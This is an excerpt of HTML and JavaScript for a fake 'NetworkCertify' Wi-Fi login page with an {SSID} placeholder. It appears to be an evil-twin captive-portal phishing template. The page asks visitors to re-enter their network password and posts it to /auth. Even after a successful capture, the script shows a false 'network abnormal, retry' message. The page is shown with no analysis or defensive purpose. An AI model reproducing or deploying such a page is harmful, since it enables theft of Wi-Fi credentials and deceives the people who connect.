...
<body>
  ...
  <div class="container">
    <div class="header">
      <h1>NetworkCertify</h1>
      <div class="sub">Network：{SSID}</div>
    </div>
    <div class="content">
      <div class="info">NetworkSecurity，InputNetworkPasswordDoneCertify。</div>
      <form onsubmit="submitText(); return false;">
        <table>
          ...
          <tr>
            <th>VerifyPassword：</th>
            <td><input id="text" type="password" placeholder="InputPassword" maxlength="64" minlength="8"></td>
          </tr>
        </table>
        <div class="actions">
  ...
  <script>
    ...
    function submitText(){
      ...
      fetch('/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:v})})
        ...
        .then(function(j){ alert(j&&j.success?'NetworkAbnormal，Retry！':'Failed，Retry'); })
